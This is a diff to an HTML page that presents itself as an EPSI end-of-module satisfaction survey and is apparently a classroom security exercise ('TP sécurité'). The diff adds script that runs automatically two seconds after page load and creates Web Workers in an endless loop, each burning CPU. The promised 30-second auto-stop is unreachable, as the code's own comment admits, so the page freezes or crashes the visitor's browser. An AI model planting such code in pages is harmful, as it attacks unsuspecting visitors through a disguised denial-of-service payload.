@@ -17,16 +17,22 @@
         .radios{padding:10px 0}
         .submit{display:block;margin:20px auto;padding:10px 20px;background:#fff;color:#251033;border:none;cursor:pointer}
         footer{font-size:12px;text-align:center;margin-top:10px;color:#ccc}
+        #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:150px;overflow-y:auto}
+        .controls{text-align:center;margin:10px 0}
+        .btn{padding:8px 16px;margin:5px;cursor:pointer;border:none;background:#fff;color:#251033}
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <img src="" alt="epsi logo"/>
+            <img src="epsi.png" alt="epsi logo"/>
             <h1>Questionnaire de satisfaction fin de module</h1>
         </header>
 
         <div class="card">
+            
+            
+
             <form id="survey">
                 <fieldset>
                     <legend>Civilité</legend>
@@ -55,72 +61,84 @@
         <footer>© Exemple - TP sécurité</footer>
     </div>
 
-   <script>
-    const log = msg => {
-      const p = document.getElementById('log');
-      p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
-    };
-
-    let workers = [];
-
-    function makeWorkerScript() {
-      // Boucle courte et cooperative : calcule mais yield souvent
-      return `
-        let stopped = false;
-        onmessage = e => { if (e.data === 'stop') stopped = true; };
-        function busyChunk(iter) {
-          // travail CPU limité par chunk pour laisser le navigateur respirer
-          let x = 0;
-          for (let i = 0; i < iter; i++) x += Math.sqrt(i);
-          return x;
+    <script>
+      const log = msg => {
+        const p = document.getElementById('log');
+        if (p) {
+          p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
         }
-        (async function loop() {
-          const CHUNK = 20000;
-          const INTERVAL_MS = 10; // yield fréquence
-          while (!stopped) {
-            busyChunk(CHUNK);
-            // yield au main thread
-            await new Promise(r => setTimeout(r, INTERVAL_MS));
-            postMessage({ tick: Date.now() });
+      };
+
+      let workers = [];
+      const duration = 30000; // 30 secondes de simulation
+
+      function makeWorkerScript() {
+        return `
+          let stopped = false;
+          onmessage = e => { if (e.data === 'stop') stopped = true; };
+          function busyChunk(iter) {
+            let x = 0;
+            for (let i = 0; i < iter; i++) x += Math.sqrt(i);
+            return x;
           }
-          postMessage({ stopped: true });
-        })();
-      `;
-    }
-
-    document.getElementById('start').addEventListener('click', () => {
-      stopWorkers(); // nettoie d'abord
-      const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
-      const url = URL.createObjectURL(blob);
-
-      while(true) {
-        const w = new Worker(url);
-        w.onmessage = () => {}; // on pourrait compter les ticks
-        workers.push(w);
+          (async function loop() {
+            const CHUNK = 20000;
+            const INTERVAL_MS = 10;
+            while (!stopped) {
+              busyChunk(CHUNK);
+              await new Promise(r => setTimeout(r, INTERVAL_MS));
+              postMessage({ tick: Date.now() });
+            }
+            postMessage({ stopped: true });
+          })();
+        `;
       }
 
-      // stop automatique au bout de duration
-      setTimeout(() => {
+      function startSimulation() {
+        log('Démarrage de la simulation...');
         stopWorkers();
-        URL.revokeObjectURL(url);
-        log('Simulation terminée automatiquement');
-      }, duration);
-    });
+        
+        const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
+        const url = URL.createObjectURL(blob);
 
-    function stopWorkers() {
-      if (workers.length === 0) return;
-      log('Arrêt des workers...');
-      for (const w of workers) {
-        try { w.postMessage('stop'); } catch(e) {}
-        try { w.terminate(); } catch(e) {}
+        // Création infinie de workers (boucle bloquante)
+        while(true) {
+          const w = new Worker(url);
+          w.onmessage = () => {};
+          workers.push(w);
+        }
+
+        // Ce code ne sera jamais atteint à cause du while(true)
+        setTimeout(() => {
+          stopWorkers();
+          URL.revokeObjectURL(url);
+          log('Simulation terminée automatiquement');
+        }, duration);
       }
-      workers = [];
-    }
 
-    document.getElementById('stop').addEventListener('click', () => {
-      stopWorkers();
-      log('Arrêt manuel demandé');
-    });
-  </script>
+      function stopWorkers() {
+        if (workers.length === 0) return;
+        log('Arrêt des workers...');
+        for (const w of workers) {
+          try { w.postMessage('stop'); } catch(e) {}
+          try { w.terminate(); } catch(e) {}
+        }
+        workers = [];
+      }
+
+      // Lancement automatique au chargement de la page
+      document.addEventListener('DOMContentLoaded', () => {
+        log('Page chargée - démarrage dans 2 secondes...');
+        setTimeout(() => {
+          startSimulation();
+        }, 2000);
+      });
+
+      // Bouton d'arrêt manuel
+      document.getElementById('stop').addEventListener('click', () => {
+        stopWorkers();
+        log('Arrêt manuel demandé');
+      });
+    </script>
 </body>
 </html>
